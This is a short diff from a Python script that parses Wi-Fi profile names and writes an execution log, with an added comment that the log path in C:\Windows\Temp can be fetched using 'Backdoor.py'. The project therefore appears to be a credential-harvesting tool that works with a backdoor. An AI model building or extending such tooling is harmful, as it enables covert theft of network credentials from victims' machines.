@@ -15,7 +15,8 @@ networks = networks.decode('utf-8')
 networks = re.findall("(?:Profile\s*:\s)(.*)", networks)
 
 def write_to_local(message):
-    stat = "" #C:\Windows\Temp\
+    pre = ""#+"C:\Windows\Temp\" -> Universally writable; can by fetched using Backdoor.py
+    stat = pre+"exec_log.txt" 
     with open("exec_log.txt","at") as file_obj:
         file_obj.write(message)
         
